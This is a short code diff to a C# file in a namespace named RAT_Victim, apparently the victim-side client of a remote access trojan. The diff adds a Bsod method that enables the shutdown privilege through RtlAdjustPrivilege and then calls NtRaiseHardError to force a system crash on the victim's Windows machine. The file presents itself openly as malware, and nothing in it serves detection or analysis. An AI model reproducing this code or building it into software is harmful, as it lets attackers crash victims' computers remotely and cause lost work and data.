@@ -1,4 +1,5 @@
-﻿using System.Diagnostics;
+﻿using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Media;
@@ -119,6 +120,12 @@ namespace RAT_Victim
 
             form.Controls.Add(pictureBox);
             Application.Run(form);
+        }
+
+        public static void Bsod()
+        {
+            WinApi.RtlAdjustPrivilege(19, true, false, out _);
+            WinApi.NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out _);
         }
     }
 }
